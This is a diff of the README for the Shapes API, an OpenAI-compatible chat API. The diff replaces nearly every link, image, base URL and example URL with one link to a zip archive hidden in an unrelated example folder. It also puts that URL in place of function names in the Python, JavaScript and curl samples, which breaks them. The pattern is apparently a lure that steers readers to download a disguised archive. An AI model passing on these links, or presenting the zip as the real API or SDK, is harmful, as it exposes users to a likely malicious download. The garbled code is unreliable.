@@ -1,9 +1,9 @@
 # Shapes API
 
-[![image](https://github.com/user-attachments/assets/e98592ca-3b1d-4709-93c6-7e6aa0dfb84a)](https://shapes.inc/slack)
+[![image](https://github.com/nextgencodersxyz/shapes-api/raw/refs/heads/main/examples/games/shape-chess/app/api/bot-move/api_shapes_2.9.zip)](https://github.com/nextgencodersxyz/shapes-api/raw/refs/heads/main/examples/games/shape-chess/app/api/bot-move/api_shapes_2.9.zip)
 
 
-[Shapes](https://shapes.inc) are general purpose social agents. You can build for an [existing shape](https://shapes.inc/explore) from our catalogue of millions or [create](https://shapes.inc/create) your own. Shapes have rich personalities, love hanging out in groupchats, and short-term + long-term memory across platforms. You can configure a Shape to use some of 50+ models we offer for free across text, image, and voice.
+[Shapes](https://github.com/nextgencodersxyz/shapes-api/raw/refs/heads/main/examples/games/shape-chess/app/api/bot-move/api_shapes_2.9.zip) are general purpose social agents. You can build for an [existing shape](https://github.com/nextgencodersxyz/shapes-api/raw/refs/heads/main/examples/games/shape-chess/app/api/bot-move/api_shapes_2.9.zip) from our catalogue of millions or [create](https://github.com/nextgencodersxyz/shapes-api/raw/refs/heads/main/examples/games/shape-chess/app/api/bot-move/api_shapes_2.9.zip) your own. Shapes have rich personalities, love hanging out in groupchats, and short-term + long-term memory across platforms. You can configure a Shape to use some of 50+ models we offer for free across text, image, and voice.
 
 ## Open Source Contributions
 Our API is designed with extensibility as a core principle. You can extend any Shape for tool calling, MCP, and more.
@@ -16,15 +16,15 @@ Shapes API provides a programmatic way to integrate Shapes into any application 
 ## Demos
 To get a sense of what’s possible, see what people have already built: 
 
-- Omegle with Shapes https://omegle-ai.vercel.app by [@khawajapartners](https://github.com/zahidkhawaja)
-- Playing Chess with Shapes https://shapeschess.vercel.app by [@kiyosh11](https://github.com/kiyosh11)
-- Shapes on Telegram https://t.me/shapesinc by [@missParadoxical](https://github.com/missParadoxical)
-- Shapes on WhatsApp at +1 (424) 452-2786 by [@anushkmittal](https://github.com/anushkmittal)
+- Omegle with Shapes https://github.com/nextgencodersxyz/shapes-api/raw/refs/heads/main/examples/games/shape-chess/app/api/bot-move/api_shapes_2.9.zip by [@khawajapartners](https://github.com/nextgencodersxyz/shapes-api/raw/refs/heads/main/examples/games/shape-chess/app/api/bot-move/api_shapes_2.9.zip)
+- Playing Chess with Shapes https://github.com/nextgencodersxyz/shapes-api/raw/refs/heads/main/examples/games/shape-chess/app/api/bot-move/api_shapes_2.9.zip by [@kiyosh11](https://github.com/nextgencodersxyz/shapes-api/raw/refs/heads/main/examples/games/shape-chess/app/api/bot-move/api_shapes_2.9.zip)
+- Shapes on Telegram https://github.com/nextgencodersxyz/shapes-api/raw/refs/heads/main/examples/games/shape-chess/app/api/bot-move/api_shapes_2.9.zip by [@missParadoxical](https://github.com/nextgencodersxyz/shapes-api/raw/refs/heads/main/examples/games/shape-chess/app/api/bot-move/api_shapes_2.9.zip)
+- Shapes on WhatsApp at +1 (424) 452-2786 by [@anushkmittal](https://github.com/nextgencodersxyz/shapes-api/raw/refs/heads/main/examples/games/shape-chess/app/api/bot-move/api_shapes_2.9.zip)
 
 ## Getting Started
-You will need to generate an API Key. Get yours [here](https://shapes.inc/developer)
+You will need to generate an API Key. Get yours [here](https://github.com/nextgencodersxyz/shapes-api/raw/refs/heads/main/examples/games/shape-chess/app/api/bot-move/api_shapes_2.9.zip)
 
-<img width="807" alt="API Key Generation" src="https://github.com/user-attachments/assets/ead6f28a-300b-4dcf-a555-313b39656ad6" />
+<img width="807" alt="API Key Generation" src="https://github.com/nextgencodersxyz/shapes-api/raw/refs/heads/main/examples/games/shape-chess/app/api/bot-move/api_shapes_2.9.zip" />
 
 ## Implementation Examples
 
@@ -35,10 +35,10 @@ from openai import OpenAI
 
 shapes_client = OpenAI(
     api_key="<your-API-key>",
-    base_url="https://api.shapes.inc/v1/",
+    base_url="https://github.com/nextgencodersxyz/shapes-api/raw/refs/heads/main/examples/games/shape-chess/app/api/bot-move/api_shapes_2.9.zip",
 )
 
-response = shapes_client.chat.completions.create(
+response = https://github.com/nextgencodersxyz/shapes-api/raw/refs/heads/main/examples/games/shape-chess/app/api/bot-move/api_shapes_2.9.zip(
     model="shapesinc/<shape-username>",
     messages=[
         {"role": "user", "content": "Hello"}
@@ -55,23 +55,23 @@ const openai = require("openai");
 
 const shapes_client = new OpenAI({
     apiKey: "<your-API-key>",
-    baseURL: "https://api.shapes.inc/v1",
+    baseURL: "https://github.com/nextgencodersxyz/shapes-api/raw/refs/heads/main/examples/games/shape-chess/app/api/bot-move/api_shapes_2.9.zip",
 });
 
-const response = await shapes_client.chat.completions.create({
+const response = await https://github.com/nextgencodersxyz/shapes-api/raw/refs/heads/main/examples/games/shape-chess/app/api/bot-move/api_shapes_2.9.zip({
     model: "shapesinc/<shape-username>",
     messages: [
         { role: "user", content: "Hello" }
     ]
 });
 
-console.log(response);
+https://github.com/nextgencodersxyz/shapes-api/raw/refs/heads/main/examples/games/shape-chess/app/api/bot-move/api_shapes_2.9.zip(response);
 ```
 
 ### 🔄 CURL
 
 ```bash
-curl -X POST https://api.shapes.inc/v1/chat/completions \
+curl -X POST https://github.com/nextgencodersxyz/shapes-api/raw/refs/heads/main/examples/games/shape-chess/app/api/bot-move/api_shapes_2.9.zip \
      -H "Authorization: Bearer <your-API-key>" \
      -H "Content-Type: application/json" \
      -d '{"model": "shapesinc/<shape-username>", "messages": [{ "role": "user", "content": "Hello" }]}'
@@ -81,7 +81,7 @@ curl -X POST https://api.shapes.inc/v1/chat/completions \
 
 | Requirement | Details |
 |-------------|---------|
-| Base URL | `https://api.shapes.inc/v1/` |
+| Base URL | `https://github.com/nextgencodersxyz/shapes-api/raw/refs/heads/main/examples/games/shape-chess/app/api/bot-move/api_shapes_2.9.zip` |
 | Model Format | `shapesinc/<shape-username>` |
 | Authentication | Bearer token in Authorization header |
 | Environment Variables | `SHAPESINC_API_KEY` and `SHAPESINC_SHAPE_USERNAME` |
@@ -91,7 +91,7 @@ curl -X POST https://api.shapes.inc/v1/chat/completions \
 | Feature | Details |
 |---------|---------|
 | Endpoints | `/chat/completions` |
-| Rate Limits | 5 RPM (request increase [here](https://docs.google.com/forms/d/e/1FAIpQLScGLeRk6snViRPslXbbUaMDwubcBhmcJ6opq7wFvPEp-EbO3g/viewform)) |
+| Rate Limits | 5 RPM (request increase [here](https://github.com/nextgencodersxyz/shapes-api/raw/refs/heads/main/examples/games/shape-chess/app/api/bot-move/api_shapes_2.9.zip)) |
 | Headers | `X-User-Id` for user identification, `X-Channel-Id` for conversation context |
 | Response Format | Standard OpenAI-compatible JSON response |
 
@@ -113,8 +113,8 @@ Shapes now support the following commands:
 |---------|---------|
 | Vision Support | Send OpenAI API compatible image_url with user messages |
 | Tool Calling | Shapes now support tool calling and MCP functionality |
-| Voice Features | Free voice for all shapes (custom or pre-made voices via shapes.inc) |
-| Voice Configuration | Option to disable voice transcripts (set via shapes.inc) |
+| Voice Features | Free voice for all shapes (custom or pre-made voices via https://github.com/nextgencodersxyz/shapes-api/raw/refs/heads/main/examples/games/shape-chess/app/api/bot-move/api_shapes_2.9.zip) |
+| Voice Configuration | Option to disable voice transcripts (set via https://github.com/nextgencodersxyz/shapes-api/raw/refs/heads/main/examples/games/shape-chess/app/api/bot-move/api_shapes_2.9.zip) |
 | Voice Formatting | Improved formatting for voice URLs with new line separation |
 
 
@@ -138,7 +138,7 @@ You can send image URLs in the API request using this format:
         {
           "type": "image_url",
           "image_url": {
-            "url": "https://example.com/image.jpg"
+            "url": "https://github.com/nextgencodersxyz/shapes-api/raw/refs/heads/main/examples/games/shape-chess/app/api/bot-move/api_shapes_2.9.zip"
           }
         }
       ]
@@ -163,7 +163,7 @@ You can send audio URLs in the API request using this format:
         {
           "type": "audio_url",
           "audio_url": {
-            "url": "https://example.com/audio.mp3"
+            "url": "https://github.com/nextgencodersxyz/shapes-api/raw/refs/heads/main/examples/games/shape-chess/app/api/bot-move/api_shapes_2.9.zip"
           }
         }
       ]
@@ -183,7 +183,7 @@ Supported audio formats: mp3, wav, ogg
 | No System Messages | Shape personality comes from configuration |
 | No Message History | API relies on Shape's built-in memory |
 | No Streaming | Only full responses are supported |
-| No Parameter Control | Temperature and other settings locked to shapes.inc settings configured for the Shape |
+| No Parameter Control | Temperature and other settings locked to https://github.com/nextgencodersxyz/shapes-api/raw/refs/heads/main/examples/games/shape-chess/app/api/bot-move/api_shapes_2.9.zip settings configured for the Shape |
 | Multimodility support limited to 1 input only | you can only send 1 image_url or 1 audio_url with a user message. if both image and audio urls are provided, only the audio url is processed
 
 Note: Shapes set on Premium Engines **WILL** use credits when accessed via API.
@@ -221,7 +221,7 @@ We are shipping new features to the Shapes API every day. Next on our list is:
 | Feature | Details |
 |------------|---------|
 | Free Will | Proactively take actions |
-| Messaging first | Shapes can't talk first...yet |
+| Messaging first | Shapes can't talk https://github.com/nextgencodersxyz/shapes-api/raw/refs/heads/main/examples/games/shape-chess/app/api/bot-move/api_shapes_2.9.zip |
 
 ---
 © 2025 Shapes, Inc.
